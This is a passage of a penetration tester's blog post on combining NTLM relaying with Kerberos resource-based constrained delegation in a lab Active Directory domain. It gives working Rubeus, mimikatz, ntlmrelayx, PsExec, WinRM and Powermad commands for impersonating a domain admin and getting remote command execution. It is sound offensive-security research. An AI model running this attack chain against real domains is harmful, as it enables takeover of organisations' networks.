+<p>Hold on a sec! The <code class="language-plaintext highlighter-rouge">cifs</code> SPN is only valid for access to file shares isn’t it? So how come we can execute WMI queries all of a sudden? Apparently, the <code class="language-plaintext highlighter-rouge">sname</code> field is not signed or protected by any means, so we can basically change it to the SPN we want. You could look at this as a feature or a bug. Either way, this automatic switch has been implemented in Impacket and we can see this behavior clearly in <code class="language-plaintext highlighter-rouge">wmiexec.py</code>.</p>
+
+<p>Notice how it changes the SPN from CIFs to HOST in an attempt to get a valid SPN for WMI. It doesn’t even have to request a new ticket, it just changes the name and gets a valid ticket.</p>
+
+<p>Check Secureauth’s article <a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more">Kerberos Delegation, SPNs and More</a> for more information about this.</p>
+
+<h2 id="executing-the-attack-from-windows">Executing the attack from Windows</h2>
+
+<p>Now, so far we’ve only used Linux to perform the post attack operations, but there is a lot to learn from doing this from Windows. I’m doing this from a non-domain joined Windows machine on the network.</p>
+
+<h3 id="requesting-ticket">Requesting ticket</h3>
+
+<p>You can request the service ticket from Windows with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>. Now earlier when we executed the attack we got a username and a password for a new machine account in the domain. We have to hash the machine account password to RC4 first. Note that we have to escape the <code class="language-plaintext highlighter-rouge">'</code> characters from the password as well.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe hash /password:ol@19`7+jq''''5)&amp;
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-05-19.png" alt=""></p>
+
+<p>We then use the machine account to execute the two Kerberos concepts <code class="language-plaintext highlighter-rouge">S4U2SELF</code> + <code class="language-plaintext highlighter-rouge">S4U2Proxy</code> in addition to injecting the ticket into the cache on our attacker Windows box. It is all done in one operation using the <code class="language-plaintext highlighter-rouge">/ptt</code> parameter. Thanks <a href="https://blog.harmj0y.net/">harmj0y</a>! We specify <code class="language-plaintext highlighter-rouge">s4u</code>, as the operations we want to perform, with the impersonating user <code class="language-plaintext highlighter-rouge">lkys</code> and the <code class="language-plaintext highlighter-rouge">cifs</code> ticket we want for <code class="language-plaintext highlighter-rouge">ws02.lab.local</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe s4u /user:LUJCDPUQ$ /impersonateuser:lkys /msdsspn:"cifs/ws02.lab.local" /ptt /rc4:3116C16787230147050F6835AFBF5EDF
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-09-50.png" alt=""></p>
+
+<ol>
+  <li>The first part is building AS-REQ with pre-authentication for the machine account. We can do this since we have provided the hash of the account.</li>
+  <li>We then request a TGT for the machine account from the domain controller.</li>
+  <li>We then use that TGT to perform <code class="language-plaintext highlighter-rouge">S4U2Self</code>, and acquire an impersonated service ticket for the DA <code class="language-plaintext highlighter-rouge">lkys@lab.local</code> to our machine account. It can be quite confusing because here we specify the SPN for our machine account, where as in a regular domain scenario we would normally provide the SPN for a service.</li>
+  <li>We now have “proof” in the form of a service ticket that we are the machine account. We then execute <code class="language-plaintext highlighter-rouge">S4U2Proxy</code> to the remote service, which in this case is the victim machine. So we impersonate <code class="language-plaintext highlighter-rouge">lkys</code> to the target SPN <code class="language-plaintext highlighter-rouge">cifs/ws02.lab.local</code> with <code class="language-plaintext highlighter-rouge">s4u2proxy</code> and get a valid service ticket which allows us to impersonate the domain domain <code class="language-plaintext highlighter-rouge">lkys</code> on the target machine.</li>
+</ol>
+
+<h3 id="explanation-of-the-above">Explanation of the above</h3>
+
+<p>What we are really doing here is abusing resource-based constrained delegation. You can read about this concept in the extensive article <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a>.</p>
+
+<p>Quickly explained though with the figure below as reference. In our example:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Service A</code> = the machine account <code class="language-plaintext highlighter-rouge">LUJCDPUQ$</code> which we created</li>
+  <li>Service B = the computer object <code class="language-plaintext highlighter-rouge">WS02</code></li>
+</ul>
+
+<p>We are enabling resource-based constrained delegation on that computer object using the credentials of the machine accounts <code class="language-plaintext highlighter-rouge">WS02$</code>. Essentially we are giving the the privilege to impersonate the user <code class="language-plaintext highlighter-rouge">lkys</code> on the <code class="language-plaintext highlighter-rouge">WS02</code> computer object.</p>
+
+<p><img src="https://shenaniganslabs.io/images/TrustedToAuthForDelegationWho/Diagrams/DelegationTypes.png" alt=""></p>
+
+<p>Then we have the <code class="language-plaintext highlighter-rouge">S4u2Proxy</code> request, as explained in step 4 above.</p>
+
+<p><img src="https://shenaniganslabs.io/images/TrustedToAuthForDelegationWho/Diagrams/S4U2Proxy.png" alt=""></p>
+
+<h3 id="verifying-access-1">Verifying access</h3>
+
+<p>The service ticket for <code class="language-plaintext highlighter-rouge">cifs</code> on the target as the domain admin has been imported into the cache on our box, and can be displayed with <code class="language-plaintext highlighter-rouge">klist</code>. We see taht the ticket is valid for the client <code class="language-plaintext highlighter-rouge">lkys@lab.local</code> on the <code class="language-plaintext highlighter-rouge">cifs</code> sname on the computer <code class="language-plaintext highlighter-rouge">ws02.lab.local</code>.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-18-29.png" alt=""></p>
+
+<p>We now have read access on the target host, as this ticket is used for authentication.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-25-22.png" alt=""></p>
+
+<p><em>Note that for getting command execution on the target through psexec or wmi, we need local admin on the host we are on. Without local admin we will not be able to perform psexec, wmiexec, etc. That’s why it’s a good idea to do this from your attacking host.</em></p>
+
+<h3 id="command-execution-1">Command execution</h3>
+
+<p>We can perform psexec locally from Windows since it works with <code class="language-plaintext highlighter-rouge">CIFS</code> tickets</p>
+
+<p><code class="language-plaintext highlighter-rouge">.\PsExec64.exe \\ws02.lab.local cmd</code></p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-25-51.png" alt=""></p>
+
+<h3 id="winrm">WinRM</h3>
+
+<p>Another possible way of remote code execution with a service ticket is the native WinRM. We can do this with Rubeus similarly to above before, but this time request another ticket with an additional service specified. We are going to specify that we want a <code class="language-plaintext highlighter-rouge">http</code> ticket, which is required for WinRM.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe s4u /user:LUJCDPUQ$ /impersonateuser:lkys /msdsspn:"cifs/ws02.lab.local" /ptt /rc4:3116C16787230147050F6835AFBF5EDF /altservice:http
+</code></pre></div></div>
+
+<p>We now have the <code class="language-plaintext highlighter-rouge">http</code> service ticket impersonating the domain admin <code class="language-plaintext highlighter-rouge">lkys</code> on <code class="language-plaintext highlighter-rouge">WS02</code> imported.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-44-39.png" alt=""></p>
+
+<p>And we can start a remote session on <code class="language-plaintext highlighter-rouge">WS02</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName ws02.lab.local
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-45-20.png" alt=""></p>
+
+<p>Inside the session we can see the TGS we used to authenticate with.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-16-47-15.png" alt=""></p>
+
+<h2 id="further-research">Further research</h2>
+
+<h3 id="rdp">RDP</h3>
+
+<p>So, what if we are somehow blocked from getting command execution using PsExec, WinRM and similar? If we imagine that RDP is the only way we can get remote access it’s worth looking into whether it is possible to pass a service ticket to RDP. If this is the case, it could mean there are ways of getting command execution on hosts through a service ticket without the requirement of being local administrator on the target host.</p>
+
+<p>However, we can’t see any specific parameter in RDP for passing a ticket, so this might get tricky. The <code class="language-plaintext highlighter-rouge">restrictedadmin</code> feature is of interest though.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-07-07.png" alt=""></p>
+
+<p>Mimikatz can pass the ticket, but our <code class="language-plaintext highlighter-rouge">cifs</code> and <code class="language-plaintext highlighter-rouge">http</code> tickets aren’t valid for RDP, we need a <code class="language-plaintext highlighter-rouge">termsrv</code> ticket. So similar to before, we request one with Rubeus.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe s4u /user:LUJCDPUQ$ /impersonateuser:lkys /msdsspn:"cifs/ws02.lab.local" /ptt /rc4:3116C16787230147050F6835AFBF5EDF /altservice:termsrv
+</code></pre></div></div>
+
+<p>We open mimikatz and list the tickets. As we can see, it’s been imported into the cache by the above commands so we don’t have to import it “again”. See the section below this one if you want to do exactly that.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\mimikatz.exe
+kerberos::list
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-05-04.png" alt=""></p>
+
+<p>Now start an RDP session with <code class="language-plaintext highlighter-rouge">restrictedadmin</code> which should in theory use the <code class="language-plaintext highlighter-rouge">termsrv</code> ticket that is cached</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>process::start "mstsc /restrictedadmin /v:ws02.lab.local"
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-16-42.png" alt=""></p>
+
+<p>But it does not appear to work, and I spent quite a lot of time researching this without getting to the bottom of it. It appears that RDP requires a TGT, which we don’t have to request a <code class="language-plaintext highlighter-rouge">termsrv</code> ticket of its own, and since we simply don’t have that it fails to authenticate. I even initiated some dialogue with Benjamin Delpy about this on <a href="https://twitter.com/chryzsh/status/1107751511583543296">Twitter</a>.</p>
+
+<p>I did also try to find a way to do WMI remote code execution from Windows using a service ticket, but could not figure out any working method. <strong>Ideas on any of the two? Please message me on Twitter.</strong></p>
+
+<h3 id="spn-to-service-mappings">SPN to service mappings</h3>
+
+<p>For the record, here is a reference for tickets necessary for different types of access
+<a href="https://adsecurity.org/?page_id=183">Exhaustive list at Adsecurity</a></p>
+
+<h3 id="speeding-up-the-attack">Speeding up the attack</h3>
+
+<p>If the attack is spending a lot of time enumerating privileges and such, we can speed it up by disabling a few features in <code class="language-plaintext highlighter-rouge">ntlmrelayx</code>. This also ensures we are not executing other attacks like trying to add domain admins or perform ACL modifications.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad-no-dump --no-da --no-acl --no-validate-privs
+</code></pre></div></div>
+
+<h3 id="exporting-the-ticket-from-linux-to-windows">Exporting the ticket from Linux to Windows</h3>
+
+<p>If we want to import ticket to Windows without redoing the s4u.</p>
+
+<p>First, export the ticket to a kirbi file that can be used with Mimikatz using <a href="https://github.com/rvazarkar/KrbCredExport">KrbCredExport</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python KrbCredExport/KrbCredExport.py lkys.ccache lkys.kirbi
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-20-37.png" alt=""></p>
+
+<p>Transfer the ticket over to the Windows host, and import the ticket into the session with mimikatz.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-22-08.png" alt=""></p>
+
+<p>Can now access the target <code class="language-plaintext highlighter-rouge">c$</code> share</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-21-41.png" alt=""></p>
+
+<h3 id="performing-the-attack-manually">Performing the attack manually</h3>
+
+<p>This requires that we have a user with <code class="language-plaintext highlighter-rouge">GenericWrite</code> rights over the machine account for the computer we are targeting. By default, domain user accounts will not have that unless they are the Creator of the machine account. Harmj0y posted a <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">gist</a> on how to do this.</p>
+
+<h3 id="domain-controller-doesnt-have-a-certificate-for-ldap">Domain controller doesn’t have a certificate for LDAP</h3>
+
+<p>It could be LDAPS is simply not configured, which means there is no certificate installed for LDAP on the domain controller. This is what is looks like if we try to add a machine account using ntlmrelayx with relaying to LDAP without TLS.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-13-49-28.png" alt=""></p>
+
+<p>If we somehow already have access to a domain user, we can get around this by adding a machine account manually with <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>. This works over LDAP without TLS because Windows will use GSSAPI signing and sealing if required, which also encrypts the packets. This is different than LDAPS, because signing and/or sealing is not performed when relaying because the negotiated session key can’t be obtained. Thanks for this clarification, @elad_shamir and @dirkjanm!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-MachineAccount -MachineAccount test -Domain lab.local -DomainController dc01.lab.local -Credential chry
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-27-54.png" alt=""></p>
+
+<p>Note that above I need to specify a domain context using a domain user, because I was executing the script from a non-domain joined machine.</p>
+
+<p>Now when doing the relaying, specify to use the newly created machine account with the <code class="language-plaintext highlighter-rouge">—escalate-user</code> parameter followed by the machine account we added. Note here that we specify <code class="language-plaintext highlighter-rouge">ldap</code> and not <code class="language-plaintext highlighter-rouge">ldaps</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t ldap://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs --escalate-user test$
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-45-34.png" alt=""></p>
+
+<p>Once the attack has been performed, the computer we targeted should have the account we added in the <code class="language-plaintext highlighter-rouge">PrincipalsAllowedToDelegateToAccount</code> attribute, in addition to the machine account which was created when I executed the attack earlier.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Get-ADComputer WS02 -Properties PrincipalsAllowedToDelegateToAccount</code></p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-46-31.png" alt=""></p>
+
+<p>And from here we can request a ticket like before and execute the rest of the attack.</p>
+
+<h2 id="questions">Questions</h2>
+
+<h3 id="1---are-we-relaying-the-domain-user-or-machine-account">1 - Are we relaying the domain user or machine account?</h3>
+
+<p>What we relay here is the machine account credentials, <strong>not</strong> the user credentials like with WPAD relaying attacks on IPv4. This confused me in the beginning, so I just wanted to make that abundantly clear.</p>
+
+<h3 id="2--can-we-configure-delegation-for-a-domain-user-in-our-control">2- Can we configure delegation for a domain user in our control?</h3>
+
+<p>No, we can’t simply tell the DC to set the delegation privileges on the computer object to our domain user, because that user has no SPN, so <code class="language-plaintext highlighter-rouge">s4u</code> would not work. The domain user does not have the necessary privileges to configure an SPN on itself either, as this would allow any user to turn itself into a service account.</p>
+
+<p>I did some experiments with this with another user I created, and while you can configure delegation privileges on the computer object, the user account doesn’t have an SPN so Kerberos will simply say it can’t find the SPN during the <code class="language-plaintext highlighter-rouge">s4u2self</code> process.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-17-48-23.png" alt=""></p>
+
+<h3 id="3---cant-we-capture-and-relay-smb">3 - Can’t we capture and relay SMB?</h3>
+
+<p>It is not possible to relay credentials from SMB to other protocols. That’s simply a protection integrated in Microsoft’s implementation of SMB authentication. dirkan wrote about this in the bottom half of his <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange article</a>.</p>
+
+<p>Update: vulnerabilities were published in 2019 that shows the bypass of NTLM relaying mitigations like SMB signing. Using a combination of these vulnerabilities, it is possible to relay SMB authentication to LDAP. See <a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">@dirkjanm’s article</a> for more details</p>
+
+<h3 id="4---cant-we-capture-and-relay-httpwebdav">4 - Can’t we capture and relay HTTP/WebDAV?</h3>
+
+<p>While you can relay credentials from HTTP/WebDAV to LDAP through tricks like dropping lnk files, those won’t relay the machine account credentials, only user account that accesses them. If you can find another way to get a machine account to contact you, that would work. That is basically what <a href="https://chryzsh.github.io/exploiting-privexchange/">PrivExchange</a> does.</p>
+
+<h3 id="5---can-we-do-it-over-ipv4">5 - Can we do it over IPv4?</h3>
+
+<p>Microsoft has patched the protocol fallback from DNS with <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077">MS16-077</a> where they removed both WPAD config broadcasts and automatic authentication to proxies. <del>The patch does not apply to IPv6, apparently.</del></p>
+
+<p>Note: I misunderstood this earlier and had a big a-ha moment when I reread the <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">mitm6 blog</a>. The patch indeed applies to IPv6, and the way mitm6 bypasses this patch is by letting the victim connect to the proxy, then prompt it for authentication by replying to it with <code class="language-plaintext highlighter-rouge">HTTP 407 Proxy Authentication</code> instead of the normal <code class="language-plaintext highlighter-rouge">HTTP 401</code> code.</p>
+
+<h3 id="6---can-we-execute-it-without-relaying">6 - Can we execute it without relaying?</h3>
+
+<p>Yes and no. There are a few possible scenarios here depending on your current level of access. The strict requirement for the attack access to an account with an SPN, and being able to configure resource-based constrained delegation on a computer object. As demonstrated in this article, both can be achieved by relaying a machine account’s credentials. Note that all attacks using these properties still require access to a Linux box on the network.</p>
+
+<h4 id="scenario-0---nothing-new">Scenario 0 - Nothing new</h4>
+
+<ul>
+  <li>Access to low privilege user</li>
+  <li><code class="language-plaintext highlighter-rouge">Machineaccountquota</code> &gt; 0</li>
+</ul>
+
+<p>If we already have access to a low privilege user account, we can manually create a machine account, pop a shell with it’s context, but not configure delegation for the computer object of your victim. Consequently, this does not acquire you anything you can’t get with network access only. The only exception being that you might have a way to remotely reboot your target machine, but this is not a common scenario.</p>
+
+<h4 id="scenario-1---local-privilege-escalation">Scenario 1 - Local Privilege Escalation</h4>
+
+<ul>
+  <li>Access to host as low privilege user</li>
+  <li><code class="language-plaintext highlighter-rouge">Machineaccountquota</code> &gt; 0</li>
+</ul>
+
+<p>This one is slightly more interesting as you can gain local privilege escalation by rebooting the target host. If you are a penetration tester and wish to demonstrate how your client is vulnerable, ask for a laptop, a low privilege user account and recreate this attack.</p>
+
+<h3 id="further-work">Further work</h3>
+
+<h4 id="executing-attacks-from-windows-hosts-only">Executing attacks from Windows hosts only</h4>
+
+<p><a href="https://egre55.github.io">egre55</a> and I have been talking about the possibility of porting some of these tools to Windows binaries to possible execute the discussed attacks as a low or high privileged user in an AD domain. That would make these attack primitives even more dangerous from a defense perspective than the current scenario that requires root access to a Linux box on the same network.</p>
+
+<h4 id="executing-similar-attacks-using-ipv4">Executing similar attacks using IPv4</h4>
+
+<p>There have been many PoCs for such attacks, but they often have more strict requirements to fully work. I might publish a blog post detailing such attacks.</p>
+
+<h2 id="links">Links</h2>
+
+<ul>
+  <li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">The worst of both worlds: Combining NTLM Relaying and Kerberos delegation</a></li>
+  <li><a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li>
+  <li><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">mitm6 - compromising IPv4 networks via IPv6</a></li>
+  <li><a href="https://adsecurity.org/?page_id=183">List of SPNs at adsecurity.org</a></li>
+  <li><a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more">Kerberos Delegation, SPNs and More</a></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+          <p class="page__date"><strong><svg class="svg-inline--fa fa-calendar-alt fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="calendar-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M0 464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V192H0v272zm320-196c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12v-40zm0 128c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12v-40zM192 268c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12v-40zm0 128c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12v-40zM64 268c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12H76c-6.6 0-12-5.4-12-12v-40zm0 128c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12H76c-6.6 0-12-5.4-12-12v-40zM400 64h-48V16c0-8.8-7.2-16-16-16h-32c-8.8 0-16 7.2-16 16v48H160V16c0-8.8-7.2-16-16-16h-32c-8.8 0-16 7.2-16 16v48H48C21.5 64 0 85.5 0 112v48h448v-48c0-26.5-21.5-48-48-48z"></path></svg><!-- <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> --> Updated:</strong> <time datetime="2019-04-14T16:08:00+00:00">April 14, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Combining+NTLM+Relaying+and+Kerberos+delegation%20https%3A%2F%2Fchryzsh.github.io%2Frelaying-delegation%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><svg class="svg-inline--fa fa-twitter fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="fab fa-fw fa-twitter" aria-hidden="true"></i> --><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fchryzsh.github.io%2Frelaying-delegation%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><svg class="svg-inline--fa fa-facebook fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i class="fab fa-fw fa-facebook" aria-hidden="true"></i> --><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fchryzsh.github.io%2Frelaying-delegation%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> --><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/exploiting-privexchange/" class="pagination--pager" title="Exploiting PrivExchange
+">Previous</a>
+    
+    
+      <a href="/pta-adlab/" class="pagination--pager" title="Review of Pentester Academy - Attacking and Defending Active Directory
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+      
+        
+      
+        
+          <li><a href="https://github.com/chryzsh/chryzsh.github.io" rel="nofollow noopener noreferrer"><svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-fw fa-github" aria-hidden="true"></i> --> GitHub</a></li>
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
